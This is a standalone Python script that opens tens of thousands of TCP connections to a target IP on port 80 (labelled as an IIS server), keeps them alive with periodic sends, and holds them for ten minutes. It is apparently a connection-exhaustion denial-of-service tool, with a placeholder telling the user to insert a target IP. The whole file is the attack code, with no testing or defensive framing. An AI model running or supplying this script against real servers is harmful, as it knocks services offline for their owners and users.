import socket
import time
import threading

def create_connections(target_ip, target_port, max_connections):
    connections = []
    for i in range(max_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            connections.append(s)
            print(f"Connection {i+1} established")
        except Exception as e:
            print(f"Failed to establish connection {i+1}: {e}")
            break
        time.sleep(0.01)
    return connections

def close_connections(connections):
    for i, s in enumerate(connections):
        try:
            s.close()
            print(f"Connection {i+1} closed")
        except Exception as e:
            print(f"Failed to close connection {i+1}: {e}")

def keep_connections_alive(connections, interval):
    while True:
        for i, s in enumerate(connections):
            try:
                s.send(b'KEEP_ALIVE')
                print(f"Sent keep-alive to connection {i+1}")
            except Exception as e:
                print(f"Failed to send keep-alive to connection {i+1}: {e}")
        time.sleep(interval)

if __name__ == "__main__":
    target_ip = "10.224.1.134"  # Replace with the target IP
    target_port = 80            # IIS port
    max_connections = 65565
    keep_alive_interval = 30    # seconds

    connections = create_connections(target_ip, target_port, max_connections)
    print(f"Total connections established: {len(connections)}")

    if connections:
        keep_alive_thread = threading.Thread(target=keep_connections_alive, args=(connections, keep_alive_interval))
        keep_alive_thread.daemon = True
        keep_alive_thread.start()

    try:
        time.sleep(600)  # Keep connections alive for 10 minutes
    except KeyboardInterrupt:
        print("Interrupted by user")

    close_connections(connections)
    print("All connections closed")
